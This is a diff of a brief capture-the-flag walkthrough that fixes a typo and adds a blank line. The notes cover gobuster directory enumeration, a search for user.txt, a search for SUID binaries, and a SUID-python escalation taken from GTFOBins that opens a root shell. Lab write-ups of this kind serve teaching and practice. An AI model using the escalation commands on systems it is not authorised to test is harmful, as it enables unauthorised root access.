@@ -2,6 +2,7 @@
 2nd question about apache version can be found from the first answer 
 for the gobuster we use : gobuster dir -u *target* -w /location/.../.../etc/...
 The hidden directory is the last one
+
 ///////////
 FOR THE 3RD TASK
 
@@ -12,6 +13,6 @@ We search in the terminal find / -type f -name user.txt 2> /dev/null,we found va
 
 \\\\\\\\\\\\
 4TH TASK
-We llok for files with SUID Permission using the command : find / -perm -4000 2>/dev/null
+We look for files with SUID Permission using the command : find / -perm -4000 2>/dev/null
 Once we found the unusual file we use GTFOBINS for privilege escalation 
 We use /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")',and using whoami we can see we are logged in as root,we found the flag,cat the flag and room is over!
